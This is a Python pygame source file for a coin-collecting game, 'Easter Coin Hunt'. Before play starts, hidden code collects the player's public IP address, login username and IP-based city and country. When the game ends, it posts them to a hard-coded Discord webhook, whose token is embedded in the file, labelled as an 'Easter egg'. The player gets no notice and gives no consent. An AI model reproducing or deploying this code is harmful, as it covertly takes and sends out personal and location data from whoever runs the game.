import pygame
import random
import socket
import os
import requests

# Get IP
def get_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

# Get username
def get_username():
    try:
        return os.getlogin()
    except:
        return "Unknown"

# Get location info from IP
def get_geolocation(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        return data.get("city", "Unknown"), data.get("country", "Unknown")
    except:
        return "Unknown", "Unknown"

# Send the info to a Discord webhook
def send_to_discord(ip, username, city, country):
    webhook_url = "https://discord.com/api/webhooks/1360232878323273728/rdJbyAmDva5vIESzCErPjt8an42_hqBFzVzWXrp50SPtvAIBoW2wPpg7qNOfACpwgJat"
    message = {
        "content": f"🎉 Easter egg found!\n🧠 Username: `{username}`\n🌐 IP: `{ip}`\n📍 Location: {city}, {country}"
    }
    try:
        requests.post(webhook_url, json=message)
    except Exception as e:
        print(f"❌ Failed to send to Discord: {e}")

# Game setup
pygame.init()
WIDTH, HEIGHT = 800, 600
WHITE, RED, GREEN = (255, 255, 255), (255, 0, 0), (0, 255, 0)
PLAYER_SIZE, ENEMY_SIZE, COIN_SIZE = 50, 30, 25

screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Easter Coin Hunt")

player_x, player_y = WIDTH // 2, HEIGHT - PLAYER_SIZE - 10
player_speed = 5
score = 0

enemies = [[random.randint(0, WIDTH - ENEMY_SIZE), random.randint(-HEIGHT, 0), random.randint(3, 6)] for _ in range(5)]
coins = [[random.randint(0, WIDTH - COIN_SIZE), random.randint(-HEIGHT, 0)] for _ in range(5)]

# Get info before the game starts
ip = get_ip()
username = get_username()
city, country = get_geolocation(ip)

# Game loop
running = True
clock = pygame.time.Clock()

while running:
    screen.fill(WHITE)
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    keys = pygame.key.get_pressed()
    if keys[pygame.K_LEFT] and player_x > 0:
        player_x -= player_speed
    if keys[pygame.K_RIGHT] and player_x < WIDTH - PLAYER_SIZE:
        player_x += player_speed

    # Move enemies
    for enemy in enemies:
        enemy[1] += enemy[2]
        if enemy[1] > HEIGHT:
            enemy[1] = random.randint(-HEIGHT, -ENEMY_SIZE)
            enemy[0] = random.randint(0, WIDTH - ENEMY_SIZE)
        if player_x < enemy[0] + ENEMY_SIZE and player_x + PLAYER_SIZE > enemy[0] and \
           player_y < enemy[1] + ENEMY_SIZE and player_y + PLAYER_SIZE > enemy[1]:
            running = False  # collision

    # Move coins
    for coin in coins:
        coin[1] += 5
        if coin[1] > HEIGHT:
            coin[1] = random.randint(-HEIGHT, -COIN_SIZE)
            coin[0] = random.randint(0, WIDTH - COIN_SIZE)
        if player_x < coin[0] + COIN_SIZE and player_x + PLAYER_SIZE > coin[0] and \
           player_y < coin[1] + COIN_SIZE and player_y + PLAYER_SIZE > coin[1]:
            score += 1
            player_speed += 0.2  # Slight speed boost
            coin[1] = random.randint(-HEIGHT, -COIN_SIZE)
            coin[0] = random.randint(0, WIDTH - COIN_SIZE)

    # Draw player, enemies, and coins
    pygame.draw.rect(screen, GREEN, (player_x, player_y, PLAYER_SIZE, PLAYER_SIZE))
    for enemy in enemies:
        pygame.draw.rect(screen, RED, (enemy[0], enemy[1], ENEMY_SIZE, ENEMY_SIZE))
    for coin in coins:
        pygame.draw.circle(screen, (255, 223, 0), (coin[0] + COIN_SIZE // 2, coin[1] + COIN_SIZE // 2), COIN_SIZE // 2)

    # Score display
    font = pygame.font.Font(None, 36)
    score_text = font.render(f"Score: {score}", True, (0, 0, 0))
    screen.blit(score_text, (10, 10))

    pygame.display.flip()
    clock.tick(60)

# Game over - show info
pygame.quit()

print("\n🎮 Game Over!")
print(f"🧠 Username: {username}")
print(f"🌐 IP: {ip}")
print(f"📍 Location: {city}, {country}")

send_to_discord(ip, username, city, country)
